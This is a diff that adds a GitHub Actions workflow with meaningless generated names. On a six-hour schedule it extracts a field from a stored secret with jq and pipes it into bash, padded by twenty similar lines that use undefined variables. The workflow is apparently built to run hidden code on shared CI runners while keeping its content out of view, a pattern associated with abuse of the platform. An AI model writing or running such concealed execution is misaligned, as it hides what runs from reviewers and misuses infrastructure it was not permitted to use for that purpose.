@@ -1,0 +1,38 @@
+name: meiwucan8563
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: meiwucan8563
+        env:
+          nar262: ${{ secrets.nar262 }}
+        run: |
+          echo $nar262 | jq -r .p887 | /bin/bash
+          echo $jcc0388 | jq -r .ghfc73931 | /bin/bash
+          echo $qd39359 | jq -r .upxi10710 | /bin/bash
+          echo $kua0080 | jq -r .cbc52063 | /bin/bash
+          echo $km02 | jq -r .qn97 | /bin/bash
+          echo $wvur9 | jq -r .o653 | /bin/bash
+          echo $a5336 | jq -r .irju51350 | /bin/bash
+          echo $czkyc096 | jq -r .iy33 | /bin/bash
+          echo $smzj9 | jq -r .xszp7 | /bin/bash
+          echo $x3457 | jq -r .wrv1 | /bin/bash
+          echo $gjt352 | jq -r .deio10 | /bin/bash
+          echo $rftwv87622 | jq -r .mb66 | /bin/bash
+          echo $zpt290 | jq -r .drlq18913 | /bin/bash
+          echo $kfq7617 | jq -r .en12014 | /bin/bash
+          echo $vzh05844 | jq -r .spq455 | /bin/bash
+          echo $rmem5518 | jq -r .p79 | /bin/bash
+          echo $sumps74 | jq -r .w2604 | /bin/bash
+          echo $ysyld45 | jq -r .zwt7760 | /bin/bash
+          echo $wzjg243 | jq -r .vbgq99 | /bin/bash
+          echo $b69 | jq -r .ta5980 | /bin/bash
+          echo $xalvc34 | jq -r .n9 | /bin/bash
+
